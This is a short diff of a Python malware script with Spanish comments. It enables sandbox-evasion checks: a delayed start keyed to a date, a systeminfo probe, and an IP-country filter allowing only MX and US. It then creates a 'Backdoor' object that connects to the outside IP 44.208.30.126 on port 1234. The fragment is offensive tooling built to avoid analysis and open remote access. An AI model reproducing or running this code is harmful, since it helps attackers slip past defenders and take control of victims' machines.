@@ -233,17 +233,17 @@ if __name__ == "__main__":
     sandbox = SandBoxEvasion()
 
     # Ejemplo de uso de la función dormir
-    #sandbox.dormir(activar=True, fecha_personalizada=datetime.datetime(2024, 12, 25, 0, 0), tiempo_relativo_minutos=2)
+    sandbox.dormir(activar=True, fecha_personalizada=datetime.datetime(2024, 12, 25, 0, 0), tiempo_relativo_minutos=2)
 
     # Ejecutar análisis de systeminfo
-    #sandbox.ejecutar_systeminfo()
+    sandbox.ejecutar_systeminfo()
 
     # Obtener información de IP con lista de países permitidos
-    #paises_permitidos = ["MX", "US"]
-    #sandbox.obtener_informacion_ip(paises_permitidos=paises_permitidos)
+    paises_permitidos = ["MX", "US"]
+    sandbox.obtener_informacion_ip(paises_permitidos=paises_permitidos)
 
     # Verificar asociación a controlador de dominio
-    sandbox.is_domain_controller()
+    #sandbox.is_domain_controller()
 
 try:
     my_backdoor = Backdoor("44.208.30.126", 1234)
